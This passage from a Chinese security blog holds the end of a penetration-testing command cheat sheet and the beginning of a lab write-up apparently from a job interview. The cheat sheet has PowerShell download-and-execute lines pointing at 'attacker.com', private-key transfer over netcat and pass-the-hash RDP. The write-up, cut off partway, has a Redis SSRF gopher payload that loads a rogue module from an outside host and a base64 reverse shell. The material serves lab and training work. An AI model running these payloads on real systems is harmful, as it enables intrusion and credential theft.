连接后执行的程序 [危险！！]<br>-b 允许广播<br>-g 网关 源路由跳点，最多 8 个<br>-G num 源路由指针：4、8、12……<br>-h 冗余信息<br>-i 秒 发送线路和扫描端口的延迟间隔<br>-k 设置套接字的 keepalive 选项<br>-l 监听模式，用于入站连接<br>-n 纯数字 IP 地址，不使用 DNS<br>-o 十六进制流量转储文件<br>-p port 本地端口号<br>-r 随机化本地和远程端口<br>-q 秒 在标准输入结束符 (EOF) 后退出，延迟秒数<br>-s addr 本地源地址<br>-T tos 设置服务类型<br>-t 应答 TELNET 协商<br>-u UDP 模式<br>-v 详细 [使用两次可显示更详细的信息]<br>-w 秒 连接和最终网络读取的超时时间<br>-C 将 CRLF 发送为行结束符<br>-z 零 I/O 模式 [用于扫描]<br>端口号可以是单个端口号，也可以是范围：低-高 [含]；<br>端口名称中的连字符必须使用反斜杠转义（例如 &#x27;ftp\-data&#x27;）。<br></code></pre></td></tr></table></figure><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>传输过程没有回显，可通过对比文件大小简单确认是否传输成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">接收端准备</span><br>nc -l -p 54321 &gt; received_file  # 使用54321端口监听并保存数据<br>nc -l -p 54321 &gt; id_rsa<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">发送端传输</span><br>nc 192.168.1.100 54321 &lt; /path/to/source_file<br>nc 10.2.26.216 54321 &lt; id_rsa# 例<br></code></pre></td></tr></table></figure><h2 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nikto</span> -h <span class="hljs-number">10.10.80.155</span><br></code></pre></td></tr></table></figure><h2 id="powershell-1"><a href="#powershell-1" class="headerlink" title="powershell"></a>powershell</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-ep</span> bypass<span class="hljs-comment"># 启动无策略限制的powershell</span><br><br><span class="hljs-comment"># 直接从 URL 下载脚本到内存，如果提前在脚本末尾添加了“Invoke-AllChecks”，将会下载后立即执行，相当于在内存中执行。</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://attacker.com/Privesc.ps1&#x27;</span>)<br><br><span class="hljs-comment">#  类似于 wget 或 curl，用于下载文件，分号后面是运行命令</span><br> <span class="hljs-built_in">Invoke-WebRequest</span> <span class="hljs-literal">-Uri</span> http://<span class="hljs-number">10.2</span>.<span class="hljs-number">26.216</span>:<span class="hljs-number">8000</span>/evil.msi <span class="hljs-literal">-OutFile</span> evil.msi; <span class="hljs-built_in">Start-Process</span> evil.msi <span class="hljs-literal">-Wait</span><br></code></pre></td></tr></table></figure><h2 id="proxychains4"><a href="#proxychains4" class="headerlink" title="proxychains4"></a>proxychains4</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains4 -q bash# 以静默模式打开一个新的bash会话<br></code></pre></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><h2 id="runetd"><a href="#runetd" class="headerlink" title="runetd"></a>runetd</h2><p>端口转发工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在/etc/rinetd.conf中设置</span><br>绑定地址 绑定端口 目标地址 目标端口<br>0.0.0.0 8080 192.168.1.100 80<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动</span><br>rinetd<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">停止</span><br>systemctl stop rinetd<br></code></pre></td></tr></table></figure><h2 id="rustscan"><a href="#rustscan" class="headerlink" title="rustscan"></a>rustscan</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">rustscan -a 10.10.153.136<br>rustscan -a 10.10.120.252 -r1-65535 -b 500 # 扫描所有端口，并发500<br></code></pre></td></tr></table></figure><h2 id="scp-1"><a href="#scp-1" class="headerlink" title="scp"></a>scp</h2><p>通过ssh在不同主机上复制文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">scp [选项] 源文件 目标文件<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">复制文件到远程主机</span><br>scp /path/to/local/file username@remotehost:/path/to/remote/directory<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">从远程主机复制文件到本地</span><br>scp username@remotehost:/path/to/remote/file /path/to/local/directory<br><br>-i identity_file：使用指定的私钥文件进行认证。<br>-P port：指定远程主机的SSH端口。<br>-p：保留文件的最后访问和修改时间，以及权限。<br>-q：不显示传输进度指示器。<br>-r：递归复制整个目录。<br>-v：详细模式，显示详细的传输过程信息。<br></code></pre></td></tr></table></figure><h2 id="scrabble"><a href="#scrabble" class="headerlink" title="scrabble"></a><a href="https://github.com/denny0223/scrabble/">scrabble</a></h2><p>从远程服务器恢复 .git 文件夹的简单工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">scrabble http://example.com/<br></code></pre></td></tr></table></figure><p>脚本代码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: Denny Huang &lt;denny0223@gmail.com&gt;</span><br><span class="hljs-comment"># Wed Sep 17 2014</span><br><span class="hljs-comment"># MIT License</span><br><br><span class="hljs-keyword">function</span> downloadBlob &#123;<br><span class="hljs-built_in">echo</span> downloadBlob <span class="hljs-variable">$1</span><br><br><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$&#123;1:0:2&#125;</span><br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$_</span><br><br>wget -q -nc <span class="hljs-variable">$domain</span>/.git/objects/<span class="hljs-variable">$&#123;1:0:2&#125;</span>/<span class="hljs-variable">$&#123;1:2&#125;</span><br><br><span class="hljs-built_in">cd</span> ..<br>&#125;<br><br><span class="hljs-keyword">function</span> parseTree &#123;<br><span class="hljs-built_in">echo</span> parseTree <span class="hljs-variable">$1</span><br><br>downloadBlob <span class="hljs-variable">$1</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line<br><span class="hljs-keyword">do</span><br><span class="hljs-built_in">type</span>=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br><span class="hljs-built_in">hash</span>=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span>)<br><br>[ <span class="hljs-string">&quot;<span class="hljs-variable">$type</span>&quot;</span> = <span class="hljs-string">&quot;tree&quot;</span> ] &amp;&amp; parseTree <span class="hljs-variable">$hash</span> || downloadBlob <span class="hljs-variable">$hash</span><br><span class="hljs-keyword">done</span> &lt; &lt;(git cat-file -p <span class="hljs-variable">$1</span>)<br>&#125;<br><br><span class="hljs-keyword">function</span> parseCommit &#123;<br><span class="hljs-built_in">echo</span> parseCommit <span class="hljs-variable">$1</span><br><br>downloadBlob <span class="hljs-variable">$1</span><br><br>tree=$(git cat-file -p <span class="hljs-variable">$1</span>| sed -n <span class="hljs-string">&#x27;1p&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>parseTree <span class="hljs-variable">$tree</span><br><br>parent=$(git cat-file -p <span class="hljs-variable">$1</span> | sed -n <span class="hljs-string">&#x27;2p&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br><br>[ <span class="hljs-variable">$&#123;#parent&#125;</span> -eq 40 ] &amp;&amp; parseCommit <span class="hljs-variable">$parent</span><br>&#125;<br><br>[ -z <span class="hljs-variable">$1</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;missing target url\n\n\</span><br><span class="hljs-string">Usage: scrabble &lt;url&gt;\n\</span><br><span class="hljs-string">Example: scrabble http://example.com/\n\n\</span><br><span class="hljs-string">You need make sure target url had .git folder&quot;</span>\<br>&amp;&amp; <span class="hljs-built_in">exit</span><br><br>domain=<span class="hljs-variable">$1</span><br>ref=$(curl -s <span class="hljs-variable">$domain</span>/.git/HEAD | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br><br>lastHash=$(curl -s <span class="hljs-variable">$domain</span>/.git/<span class="hljs-variable">$ref</span>)<br><br>git init<br><br><span class="hljs-built_in">cd</span> .git/objects/<br><br>parseCommit <span class="hljs-variable">$lastHash</span><br><br><span class="hljs-built_in">cd</span> ../../<br><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$lastHash</span> &gt; .git/refs/heads/master<br><br>git reset --hard<br></code></pre></td></tr></table></figure><h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit wordpress# 搜索包含关键字wordpress的漏洞<br></code></pre></td></tr></table></figure><h2 id="showmount"><a href="#showmount" class="headerlink" title="showmount"></a>showmount</h2><p>显示nfs服务器的挂载信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">showmount -e 10.10.229.201 # 显示nfs服务器的挂载信息<br><br>mount -t nfs 10.10.229.201:/mnt/share share# 尝试将nfs服务器共享目录挂载到本地share文件夹<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">NFS 缺乏身份验证和授权。通过创建具有 UID/GID 1003 (取决于挂载文件的信息，用`<span class="hljs-built_in">ls</span> -lha`查看)的本地用户，可伪装NFS共享所有者并获得了其权限</span><br>sudo useradd hijack<br>sudo usermod -u 1003 hijack<br>sudo groupmod -g 1003 hijack<br></code></pre></td></tr></table></figure><h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">上传文件</span><br>smbclient -c &#x27;put myinstaller.msi&#x27; -U t1_corine.waters -W ZA &#x27;//thmiis.za.tryhackme.com/admin$/&#x27; Korine.1994<br></code></pre></td></tr></table></figure><h2 id="socat-1"><a href="#socat-1" class="headerlink" title="socat"></a>socat</h2><p>端口转发</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">socat TCP4-LISTEN:60001,fork TCP4:10.10.51.201:80<br></code></pre></td></tr></table></figure><h2 id="ssh-1"><a href="#ssh-1" class="headerlink" title="ssh"></a>ssh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh -D 0.0.0.0:1080 -Nf root@103.199.16.14# 隧道代理<br><br>ssh -i saad_ssh_key saad@10.10.54.137# 指定私钥ssh登录靶机<br></code></pre></td></tr></table></figure><h2 id="ssh2john"><a href="#ssh2john" class="headerlink" title="ssh2john"></a>ssh2john</h2><p>将 <strong>SSH私钥</strong> 转换为 John兼容格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh2john saad_ssh_key &gt; hash # 将私钥转换为哈希文件<br>john --wordlist=/usr/share/wordlists/rockyou.txt hash# 爆破<br></code></pre></td></tr></table></figure><h2 id="ssh-keygen-1"><a href="#ssh-keygen-1" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa# 生成一对rsa密钥<br>ssh-keygen -f id_ed25519 -t ed25519# 这个也行<br>chmod 600 id_rsa # 设置私钥仅限所有者访问，这步不能少<br>echo &#x27;YOUR SSH PUBLIC KEY&#x27; &gt; /home/comte/.ssh/authorized_keys # 将公钥写入靶机ssh配置<br>ssh -i id_rsa comte@10.10.236.146# 本机ssh登录靶机<br></code></pre></td></tr></table></figure><h2 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h2><p>从文件中提取隐藏数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">steghide extract -sf oneforall.jpg<br></code></pre></td></tr></table></figure><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p>从二进制文件（如可执行文件、库文件、图片文件等）中提取可打印的字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">strings [选项] 文件名<br><br>strings valleyAuthenticator|grep -i UPX# 测试UPX壳<br></code></pre></td></tr></table></figure><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -czvf backup.tar.gz  files/<br>tar -czvf backup.tar.gz  file.php update.sh<br></code></pre></td></tr></table></figure><h2 id="tscon"><a href="#tscon" class="headerlink" title="tscon"></a>tscon</h2><p>windows自带</p><p>用于rdp劫持</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 将当前会话（会话 ID 为 3）连接到目标会话（rdp-tcp#6）</span><br>tscon <span class="hljs-number">3</span> /dest:rdp<span class="hljs-literal">-tcp</span><span class="hljs-comment">#6</span><br></code></pre></td></tr></table></figure><h2 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h2><p>指纹识别</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">whatweb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">152.130</span><span class="hljs-regexp">/spip/</span><span class="hljs-comment"># 有时需要像这样加一层目录才行，大概是因为部署的原因</span><br></code></pre></td></tr></table></figure><h2 id="which"><a href="#which" class="headerlink" title="which"></a>which</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">which gcc# 查找命令文件位置<br></code></pre></td></tr></table></figure><h2 id="wget-1"><a href="#wget-1" class="headerlink" title="wget"></a>wget</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget -P /tmp http://10.2.26.216:8000/linpeas.sh<br>wget -P /tmp http://10.2.26.216:8000/pspy64<br></code></pre></td></tr></table></figure><h2 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h2><p>linux开源rdp工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用 PtH 连接到 RDP</span><br>xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH<br></code></pre></td></tr></table></figure><h2 id="zip-1"><a href="#zip-1" class="headerlink" title="zip"></a>zip</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">unzip</span> laoyue.zip<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某公司二面靶场记录</title>
    <link href="/2025/04/18/%E6%9F%90%E5%85%AC%E5%8F%B8%E4%BA%8C%E9%9D%A2%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/04/18/%E6%9F%90%E5%85%AC%E5%8F%B8%E4%BA%8C%E9%9D%A2%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><p>ssrf直接读/flag</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-1.png" alt="image-20241213225813441"></p><h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>dict探测内网数据库端口</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-2.png" alt="image-20241215191341918"></p><p>只有1和7的6379</p><p>7存在未授权</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-3.png" alt="image-20241215191441415"></p><p>题目提示flag2在数据库里，直接读</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-4.png" alt="image-20241215191522364"></p><h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>ssrf打内网redis未授权</p><p>用<a href="https://github.com/xmsec/redis-ssrf">redis-ssrf</a></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-5.png" alt="image-20241215191915200"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.18.240.7:6379</span>/_%<span class="hljs-number">2</span>A3%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">247</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>ASLAVEOF%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2414</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A<span class="hljs-number">124.70.209.177</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A7777%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>ACONFIG%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>ASET%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adir%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">245</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A/tmp/%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2410</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adbfilename%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aexp.so%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A3%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AMODULE%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>ALOAD%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2411</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A/tmp/exp.so%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A2%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2411</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Asystem.exec%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2414</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Acat%<span class="hljs-number">24</span>%<span class="hljs-number">7</span>BIFS%<span class="hljs-number">7</span>D/flag%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aquit%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-6.png" alt="image-20241215191949331"></p><h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><h2 id="Flag1-1"><a href="#Flag1-1" class="headerlink" title="Flag1"></a>Flag1</h2><p>7001端口，直接用工具</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-7.png" alt="image-20241213230552613"></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-8.png" alt="image-20241213230604473"></p><h2 id="Flag2-1"><a href="#Flag2-1" class="headerlink" title="Flag2"></a>Flag2</h2><p>应该工具编码有问题，用base64编码反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo IyEvYmluL2Jhc2gKc2ggLWkgPiYgL2Rldi90Y3AvMTI0LjcwLjIwOS4xNzcvNzc3NyAwPiYxCg== | base64 -d | bash<br></code></pre></td></tr></table></figure><p>然后上线vshell</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-9.png" alt="image-20241214185114392"></p><p>上传fscan扫描</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-10.png" alt="image-20241214194458512"></p><p>12开了3306，是个mysql</p><p>找与mysql有关的文件</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">grep -iR mysql</span><br></code></pre></td></tr></table></figure><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-11.png" alt="image-20241214184950010"></p><p>加密的密码：<br><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-12.png" alt="image-20241214185345279"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;AES&#125;</span><span class="language-xml">ZhArsOkXPBA9AvAwRxNxpK4G0WlHlpNFBZVsu+PDlYU=</span><br></code></pre></td></tr></table></figure><p>java8换好几个工具都报错，下了个java7才解出来</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-13.png" alt="image-20241214194058591"></p><p><code>Meetsec#1024</code></p><p>内网穿透用vshell的隧道代理</p><p>用navicat读flag</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-14.png" alt="image-20241214194747599"></p><h2 id="Flag3-1"><a href="#Flag3-1" class="headerlink" title="Flag3"></a>Flag3</h2><p>mysql读文件</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-15.png" alt="image-20241214195215678"></p><h1 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h1><h2 id="Flag1-2"><a href="#Flag1-2" class="headerlink" title="Flag1"></a>Flag1</h2><p>fscan扫一下</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-16.png" alt="image-20241214123153296"></p><p>springboot信息泄露</p><p>访问<a href="http://119.45.21.241:22883/actuator/env">119.45.21.241:22883/actuator/env</a></p><p>在最下面找到flag</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-17.png" alt="image-20241214123341751"></p><h2 id="Flag2-2"><a href="#Flag2-2" class="headerlink" title="Flag2"></a>Flag2</h2><p>访问/actuator/heapdump下载内存文件</p><p>用visualvm打开，查到数据库密码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> s <span class="hljs-keyword">from</span> java.util.LinkedHashMap$Entry s <span class="hljs-keyword">where</span> /spring.datasource.<span class="hljs-keyword">password</span>/.test(s.<span class="hljs-keyword">key</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-18.png" alt="image-20241214130600584"></p><p>数据库密码为<code>MeetSec@2nd!2022</code></p><p>用navicat连接，找到flag</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-19.png" alt="image-20241214131014262"></p><h1 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h1><h2 id="Flag1-3"><a href="#Flag1-3" class="headerlink" title="Flag1"></a>Flag1</h2><p>beemcms，直接搜nday</p><p>[<a href="https://blog.csdn.net/shawdow_bug/article/details/127020190">代码审计] beecms 4.0 漏洞总结_bees cms漏洞-CSDN博客</a></p><p>先伪造登录进后台</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 